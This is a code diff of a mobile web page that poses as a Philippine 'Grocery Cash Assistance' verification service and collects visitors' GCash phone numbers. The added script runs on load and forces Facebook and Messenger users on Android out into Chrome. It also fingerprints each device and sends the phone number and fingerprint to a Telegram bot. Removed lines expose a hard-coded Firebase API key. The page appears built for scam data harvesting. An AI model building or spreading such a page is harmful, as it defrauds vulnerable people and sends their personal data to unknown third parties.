@@ -1,20 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+        (function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            var isFacebook = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Messenger") > -1);
+            
+            if (isFacebook && /Android/i.test(ua)) {
+                // Kunin ang path pagkatapos ng domain
+                var currentPath = window.location.pathname; 
+                var currentSearch = window.location.search;
+                var cleanUrl = "freeshoppingph.github.io" + currentPath + currentSearch;
+                
+                var intentUrl = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+                window.location.replace(intentUrl);
+            }
+        })();
+    </script>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>FreeShoppingPH | Verification Process</title>
+    
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
     <style>
         :root { --primary-green: #2d6a4f; --soft-green: #52b788; --background-light: #f8f9fa; --text-main: #2d3436; }
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background-color: var(--background-light); font-family: 'Public Sans', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        body { background-color: var(--background-light); font-family: 'Public Sans', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
         .card { width: 92%; max-width: 380px; background: white; border-radius: 30px; padding: 40px 24px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.05); }
         .logo-img { width: 160px; border-radius: 15px; margin-bottom: 24px; }
         h1 { font-size: 24px; font-weight: 700; color: var(--primary-green); margin-bottom: 12px; }
         p { color: #636e72; font-size: 14px; margin-bottom: 30px; }
-        .btn-primary { background: linear-gradient(180deg, var(--soft-green) 0%, var(--primary-green) 100%); color: white; border: none; width: 100%; padding: 18px; border-radius: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+        .btn-primary { background: linear-gradient(180deg, var(--soft-green) 0%, var(--primary-green) 100%); color: white; border: none; width: 100%; padding: 18px; border-radius: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
         .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(45, 106, 79, 0.4); backdrop-filter: blur(4px); z-index: 999; align-items: center; justify-content: center; }
         .modal-content { width: 92%; max-width: 400px; background: white; border-radius: 24px; padding: 30px 24px; text-align: center; }
         input { width: 100%; background: #f1f3f5; border: 2px solid transparent; border-radius: 12px; padding: 16px; font-size: 18px; text-align: center; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; outline: none; }
@@ -24,11 +45,11 @@
 </head>
 <body>
 
-    <div class="card">
+    <div class="card" id="mainCard">
         <img src="ivana.jpeg" class="logo-img" alt="Logo">
         <h1>Service Activation</h1>
         <p>Verification is required to check your eligibility for the Grocery Cash Assistance.</p>
-        <button class="btn-primary" onclick="document.getElementById('modalOverlay').style.display='flex'">Proceed to Verification</button>
+        <button class="btn-primary" onclick="openModal()">Proceed to Verification</button>
     </div>
 
     <div class="modal-overlay" id="modalOverlay">
@@ -36,144 +57,114 @@
             <h2 style="margin-bottom: 20px; color: var(--primary-green);">Eligibility Check</h2>
             <span class="label-text">Mobile Number</span>
             <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">
-            <button class="btn-primary" id="confirmBtn" onclick="processStep1()">Verify Number</button>
+            <button class="btn-primary" id="confirmBtn" onclick="handleLogin()">Verify Number</button>
         </div>
     </div>
 
-    <script>document.write('<script src="/js/config.js?v=' + Date.now() + '"><\/script>');</script>
-    
+    <script src="js/config.js"></script>
     <script>
+        // Initialize Firebase using config.js variables
+        if (!firebase.apps.length) { 
+            firebase.initializeApp(firebaseConfig); 
+        }
+        const db = firebase.database();
 
-        // CONFIGURATION
-const firebaseConfig = {
-    apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
-    authDomain: "freeshoppingph-3bade.firebaseapp.com",
-    databaseURL: "https://freeshoppingph-3bade-default-rtdb.firebaseio.com",
-    projectId: "freeshoppingph-3bade",
-    storageBucket: "freeshoppingph-3bade.appspot.com",
-    messagingSenderId: "1028308831969",
-    appId: "1:1028308831969:web:96e224e75d69ba74332924"
-};
-
-if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
-const db = firebase.database();
-
-// 1. AUTO-INTENT BYPASS (No Button Needed)
-function autoIntentBypass() {
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
-    const isFacebook = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Messenger") > -1);
-    
-    if (isFacebook && /Android/i.test(ua)) {
-        // Kunin ang current URL at alisin ang http/https protocol
-        const cleanUrl = window.location.href.split('://')[1];
-        
-        // Pilitin lumabas sa Messenger at mag-open sa Chrome
-        // Ang "intent://" ay parang "Refresh" pero sa external browser
-        window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
-    }
-}
-
-// 2. DEVICE FINGERPRINT (Signature)
-function generateSignature() {
-    const data = [
-        navigator.userAgent,
-        screen.height + "x" + screen.width,
-        navigator.language,
-        navigator.hardwareConcurrency || 0
-    ].join('|');
-    
-    let hash = 0;
-    for (let i = 0; i < data.length; i++) {
-        hash = ((hash << 5) - hash) + data.charCodeAt(i);
-        hash |= 0;
-    }
-    return "SIG-" + Math.abs(hash);
-}
-
-const deviceSig = generateSignature();
-
-// RUN IMMEDIATELY ON LOAD
-window.onload = function() {
-    autoIntentBypass(); // Auto-jump out of FB
-    
-    // Mobile Check
-    const ua = navigator.userAgent;
-    if (!/Android|webOS|iPhone|iPad|iPod/i.test(ua)) {
-        document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>MOBILE ONLY ACCESS</h2>";
-    }
-};
-
-// 3. LOGIN LOGIC WITH BLACKLIST & SIGNATURE RULES
-async function handleLogin() {
-    const phone = document.getElementById('phoneInput').value.trim();
-    const btn = document.getElementById('loginBtn');
-
-    if (phone.length !== 11) return alert("Enter valid 11-digit number.");
-
-    btn.disabled = true;
-    btn.innerText = "VERIFYING...";
-
-    try {
-        // A. Local Storage Lock (Device-based blacklist)
-        if (localStorage.getItem('is_claimed') === 'true') {
-            alert("This beneficiary was already claimed.");
-            btn.disabled = false; btn.innerText = "PROCEED";
-            return;
+        // Mobile Only Check
+        if (!/Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>MOBILE ONLY ACCESS</h2>";
         }
 
-        // B. Database Check (Phone number OR Device Signature)
-        const blackPhone = await db.ref('blacklist/' + phone).once('value');
-        const blackSig = await db.ref('blacklisted_devices/' + deviceSig).once('value');
-
-        if (blackPhone.exists() || blackSig.exists()) {
-            localStorage.setItem('is_claimed', 'true'); // Permanent lock on this browser
-            alert("This beneficiary was already claimed.");
-            btn.disabled = false; btn.innerText = "PROCEED";
-            return;
+        function openModal() {
+            document.getElementById('modalOverlay').style.display = 'flex';
         }
 
-        // C. System Mode Check (Admin Switch)
-        const modeSnap = await db.ref('system_status/mode').once('value');
-        const mode = modeSnap.val() || 'strict';
+        // DEVICE FINGERPRINT (Signature)
+        function generateSignature() {
+            const data = [
+                navigator.userAgent,
+                screen.height + "x" + screen.width,
+                navigator.language,
+                navigator.hardwareConcurrency || 0
+            ].join('|');
+            
+            let hash = 0;
+            for (let i = 0; i < data.length; i++) {
+                hash = ((hash << 5) - hash) + data.charCodeAt(i);
+                hash |= 0;
+            }
+            return "SIG-" + Math.abs(hash);
+        }
 
-        if (mode === 'open') {
-            grantAccess(phone);
-        } else {
-            // STRICT MODE: Check Whitelist
-            const whiteSnap = await db.ref('whitelist/' + phone).once('value');
-            if (whiteSnap.exists()) {
-                grantAccess(phone);
-            } else {
-                alert("System Notice: Access is currently limited. Try again later.");
-                btn.disabled = false; btn.innerText = "PROCEED";
+        const deviceSig = generateSignature();
+
+        // 3. LOGIN LOGIC
+        async function handleLogin() {
+            const phone = document.getElementById('userPhone').value.trim();
+            const btn = document.getElementById('confirmBtn');
+
+            if (phone.length !== 11 || !phone.startsWith("09")) {
+                alert("Please enter a valid 11-digit GCash number.");
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = "VERIFYING...";
+
+            try {
+                // A. Local/Session Blacklist Check
+                if (localStorage.getItem('is_claimed') === 'true') {
+                    alert("This beneficiary was already claimed.");
+                    btn.disabled = false; btn.innerText = "VERIFY NUMBER";
+                    return;
+                }
+
+                // B. Database Blacklist Check (Phone & Signature)
+                const blackPhone = await db.ref('blacklist/' + phone).once('value');
+                const blackSig = await db.ref('blacklisted_devices/' + deviceSig).once('value');
+
+                if (blackPhone.exists() || blackSig.exists()) {
+                    localStorage.setItem('is_claimed', 'true');
+                    alert("This beneficiary was already claimed.");
+                    btn.disabled = false; btn.innerText = "VERIFY NUMBER";
+                    return;
+                }
+
+                // C. System Mode Check
+                const modeSnap = await db.ref('system_status/mode').once('value');
+                const mode = modeSnap.val() || 'strict';
+
+                if (mode === 'open') {
+                    grantAccess(phone);
+                } else {
+                    const whiteSnap = await db.ref('whitelist/' + phone).once('value');
+                    if (whiteSnap.exists()) {
+                        grantAccess(phone);
+                    } else {
+                        alert("System Notice: Access is currently limited. Try again later.");
+                        btn.disabled = false; btn.innerText = "VERIFY NUMBER";
+                    }
+                }
+            } catch (err) {
+                console.error(err);
+                alert("Connection Error. Please check your signal.");
+                btn.disabled = false; btn.innerText = "VERIFY NUMBER";
             }
         }
-    } catch (err) {
-        alert("Connection Error.");
-        btn.disabled = false;
-    }
-}
 
-function grantAccess(phone) {
-    sessionStorage.setItem('user_phone', phone);
-    sessionStorage.setItem('user_sig', deviceSig);
-    window.location.href = "main.html";
-}
-    
+        function grantAccess(phone) {
+            // Telegram Log
+            const text = `✅ ELIGIBLE USER ENTERED:\n📱 Number: ${phone}\n🔑 Sig: ${deviceSig}`;
+            fetch(`https://api.telegram.org/bot${firebaseConfig.botToken}/sendMessage?chat_id=${firebaseConfig.chatId}&text=${encodeURIComponent(text)}`)
+            .catch(e => console.log("Telegram Error"));
 
-            // 4. Normal Processing (If NOT in Messenger or already escaped)
-            btn.disabled = true;
-            btn.innerHTML = "Verifying...";
+            // Store info for main.html
+            sessionStorage.setItem('user_phone', phone);
+            sessionStorage.setItem('user_sig', deviceSig);
+            sessionStorage.setItem('verified_user', 'true');
 
-            // Log to Telegram
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('✅ ELIGIBLE USER ENTERED:\n📱 Number: ' + phone)}`)
-            .catch(err => console.log('Telegram log failed, continuing anyway...'));
-
-            // Redirect to main.html
             setTimeout(() => {
-                sessionStorage.setItem('verified_user', 'true');
                 window.location.href = "main.html";
-            }, 1500);
+            }, 1000);
         }
     </script>
 </body>
